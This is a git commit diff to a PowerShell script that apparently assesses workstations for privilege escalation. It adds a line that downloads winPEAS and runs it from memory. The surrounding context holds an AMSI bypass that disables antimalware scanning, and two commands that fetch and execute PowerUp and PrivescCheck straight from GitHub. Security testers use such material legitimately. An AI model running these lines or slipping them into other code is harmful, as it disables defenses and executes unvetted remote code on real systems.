6484aafeb16de0cac007a11045b166b89c794272
Michael Ritter <info@michi-ritter.de>
2022-03-03 15:30:29 +0100

    Added WinPeas

--- Invoke-WorkstationAssessment.ps1
+++ Invoke-WorkstationAssessment.ps1
@@ -6,13 +6,22 @@ Stop-Transcript | out-null
 $ErrorActionPreference = "Continue"
 Start-Transcript -path ".\Invoke-WorkstatationAssessment.log" -append
 
+#### AMSI Bypass
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+#### PowerUp
 iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
 Invoke-PrivescAudit -ErrorAction SilentlyContinue -HTMLReport
 
+#### Invoke-PrivescCheck
 iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
 Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,XML -Extended
 
+#### winPEAS
+# Get latest release
+$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
 
 Function Get-BadPrivilege
